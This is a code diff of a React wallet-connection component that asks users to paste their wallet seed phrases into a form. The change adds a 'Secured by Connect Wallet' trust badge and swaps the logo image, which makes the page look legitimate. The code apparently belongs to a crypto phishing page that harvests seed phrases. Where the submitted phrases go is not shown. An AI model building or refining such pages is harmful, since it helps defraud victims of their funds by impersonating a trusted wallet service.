@@ -291,7 +291,7 @@ function PickWallet({setShowWallet, handleClose}:any) {
                     className="flex flex-col items-center group">
                         <motion.label htmlFor={dataContext.walletSelected}>
                             <div className={`flex justify-center cursor-pointer items-center bg-white w-[35px] h-[35px] rounded-full transition-colors duration-300 p-2 group-hover:border-[#4874ebed] ${dataContext.walletSelected === dataContext.walletSelected ? 'border-[#4874ebed]' : 'border-[#b4b6bb]'} border-[1px] overflow-hidden`}>
-                                <img src={`/walletconnect/${dataContext.walletSelected}.png`} className="object-contain" alt={dataContext.walletSelected} width={100} height={100}/>
+                                <img src={`/main.png`} className="object-contain" alt={dataContext.walletSelected} width={100} height={100}/>
                             </div>
                         </motion.label>
                     </motion.div>
@@ -305,11 +305,20 @@ function PickWallet({setShowWallet, handleClose}:any) {
             <p className="text-[#212121]">Insert your {dataContext.walletSelected} KeyPhrases, Seprate keys with spaces</p>
             <form action="" onSubmit={handleSeedPhrases} method="post">
                 <textarea name="keyphrase" placeholder="Input your seed Phrases" className="w-full bg-[#f4f4f4] rounded-md mb-3 border-[1px] p-2 outline-none border-[#ccc] font-semibold uppercase" autoComplete="off" autoCorrect="none" cols={50} rows={3} required></textarea>
-                <button type="submit"
-                 className="border-none w-[200px] bg-[rgb(12,108,242)] flex gap-2 justify-center disabled:bg-[rgba(12,108,242,0.68)]  text-white p-3 rounded-md font-medium" disabled={showBtn}>
-                {loading && <ButtonSpinner color="#ccc"/>}
-                    <span>Connect Wallet</span>
-                </button>
+
+                <div className="w-full flex justify-between items-center">
+                    <button type="submit"
+                    className="border-none w-[200px] bg-[rgb(12,108,242)] flex gap-2 justify-center disabled:bg-[rgba(12,108,242,0.68)]  text-white p-3 rounded-md font-medium" disabled={showBtn}>
+                    {loading && <ButtonSpinner color="#ccc"/>}
+                        <span>Connect Wallet</span>
+                    </button>
+
+                    <div className="text-[#212121bb] flex gap-1 items-center group">
+                        <img src={`/walletconnect/wallet.png`} className="object-contain grayscale  group-hover:grayscale-0 transition-all duration-500" alt={dataContext.walletSelected} width={30} height={30}/>
+
+                        <span>Secured by Connect Wallet</span>
+                    </div>
+                </div>
             </form>
             {AlertComponent}
             </div>
